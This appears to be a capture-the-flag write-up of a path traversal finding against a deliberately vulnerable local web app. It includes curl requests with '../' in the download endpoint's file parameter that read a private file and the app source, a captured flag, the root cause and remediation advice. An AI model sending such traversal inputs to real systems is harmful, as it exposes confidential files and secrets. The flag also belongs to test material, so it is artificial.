# Finding 5: Path Traversal — /download

**Flag:** `FLAG{traversal_59cc94761a66}`

## Steps

1. Baseline request confirmed the normal, intended use of the endpoint:
   ```
   curl "http://127.0.0.1:5050/download?file=welcome.txt"
   # Welcome to Vuln Hub. This file is meant to be downloadable.
   ```

2. Supplied a relative path with `../` segments to escape the intended
   `public/` directory and reach a sibling `private/` directory:
   ```
   curl "http://127.0.0.1:5050/download?file=../private/employee_notes.txt"
   ```

3. Server returned (HTTP 200) a file it was never meant to serve:
   ```
   CONFIDENTIAL - employees only
   If you can read this through the download endpoint, the path filter failed.
   FLAG{traversal_59cc94761a66}
   ```

4. **Additional impact (same bug, more severe):** the same traversal also
   reaches the application's own source file one directory further up:
   ```
   curl "http://127.0.0.1:5050/download?file=../app.py"
   ```
   This returned the **entire `app.py` source**, confirming the endpoint has
   no containment at all — not just one planted "private" file, but the
   whole codebase (and, in a real deployment, potentially config/secrets
   co-located with the app).

## Root cause
`/download` builds the file path by joining untrusted user input directly
onto a base directory (`os.path.join(APP_DIR, "public", name)`) with no
validation that the resolved path stays inside `public/`. `../` sequences in
`name` let the path escape the intended directory entirely.

## Remediation
- Resolve the final path with `os.path.realpath()`/`Path.resolve()` and
  verify it is still a descendant of the intended base directory before
  opening it; reject the request otherwise.
- Prefer serving by an opaque lookup key (e.g. a whitelist of allowed
  filenames, or a DB-backed file ID) rather than a raw filename from the
  client.
- Use a hardened static-file helper (e.g. Flask's `send_from_directory`,
  which already guards against traversal) instead of hand-rolled
  `os.path.join` + `open()`.
